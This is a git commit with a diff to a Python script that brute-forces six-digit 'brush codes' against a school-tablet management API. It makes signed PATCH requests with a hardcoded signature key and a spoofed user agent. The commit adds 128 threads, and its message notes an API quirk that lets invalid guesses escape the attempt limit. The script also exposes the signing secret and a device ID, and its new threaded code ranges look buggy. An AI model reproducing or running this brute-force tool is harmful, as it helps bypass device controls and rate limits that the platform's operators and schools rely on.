403e5ea9fdd8460fc32ef170e6d256b32edf1271
Broken Data Research Group <78301006+BushHuang@users.noreply.github.com>
2026-01-18 21:15:59 +0800

    XH-CBC v1.1.0.200260118
    增加多线程支持
    事实证明过于成功了（128线程差点把电脑卡爆）
    发现XH的API特性：如果提交的code不合法，那么不计入成功尝试次数，无论多少回都不会达到API Limit
    代理的话暂时找不到好用的，TODO吧

--- xh_checkbrushcode.py
+++ xh_checkbrushcode.py
@@ -1,8 +1,22 @@
+import queue
 import requests
 import json
 import hashlib
 import time
-def get_zty_sign_url(base_url,method,payload):
+import threading
+import concurrent.futures
+
+def task(name, delay):
+    print(f"线程 {name} 启动")
+    time.sleep(delay)
+    print(f"线程 {name} 结束")
+    return f"{name} 完成"
+
+# 创建线程池（最大线程数为2）
+
+
+
+def get_zty_sign_url(base_url, method, payload):
     timestamp = str(int(time.time() * 1000))
     SIGNATURE_KEY = "eptim]q34imt5b]-q04i5q=fdkfjfsadlkjfasdfrt573df4pltoy]-pn965498d"
     sign_raw_string = f"{method}{base_url}{timestamp}{SIGNATURE_KEY}{payload}"
@@ -10,12 +24,12 @@ def get_zty_sign_url(base_url,method,payload):
     final_url = f"{base_url}?sign={sign}&t={timestamp}"
     return final_url
 
-def patch_brush_code(code, device_id):
 
+def patch_brush_code(code, device_id):
     base_url = "https://ztp.yunzuoye.net/api/v2/pub/platform/brushCode"
 
     user_agent = f"com.xuehai.launcher/v1.21.06.20251212hwS (SM-P200; android; 9; {device_id})"
-    
+
     headers = {
         "Content-Type": "application/json",
         "Accept": "*/*",
@@ -27,34 +41,41 @@ def patch_brush_code(code, device_id):
         "deviceId": device_id
     }
     payload_data = json.dumps(payload_dict, separators=(',', ':'))
-    
-    method="PATCH"
-    final_url=get_zty_sign_url(base_url,method,payload_data)
- 
+
+    method = "PATCH"
+    final_url = get_zty_sign_url(base_url, method, payload_data)
+
     try:
         response = requests.patch(final_url, headers=headers, data=payload_data)
 
-        if response.status_code!=200 and response.status_code!=400:
-            print("请求发生错误！")
+        if response.status_code != 200 and response.status_code != 400:
+            print("Error occurs while requesting!")
             print(response.text)
 
-        if response.status_code!=400:
-            response.raise_for_status() 
-        
-        #print("响应内容:", response.text)
-        return response.json()
+        if response.status_code != 400:
+            response.raise_for_status()
+
+
+            # print("响应内容:", response.text)
+        result = response.json()
+        print(f"Tried {code} returned with code {result['code']} and msg {result['msg']}")
+        return result
 
     except requests.exceptions.RequestException as e:
         print(f"{e}")
         return None
 
-if __name__=="__main__":
-    try_code = "100000"
-    device_id = "Your own device id here."
-    for i in range(100000,999999):
-        try_code=str(i)
-        result = patch_brush_code(try_code, device_id)
-        if result['code']!=400:
-            print(f'OK!!!!!!!!!{i}')
-            break
-        print(f'Tried.{i}')
+def batch_patch_brush_code(code_start, code_end, device_id):
+    #print(f"Start trying code from {code_start} to {code_end}")
+    for i in range(code_start, code_end+1):
+        patch_brush_code(f"{i:06}", device_id)
+    #print(f"Complete trying code from {code_start} to {code_end}")
+
+
+if __name__ == "__main__":
+
+    device_id = "R52TA0K08HJ"
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=128) as executor:
+        for i in range(1,100):
+            executor.submit(batch_patch_brush_code, i*10, i*10+100, device_id)
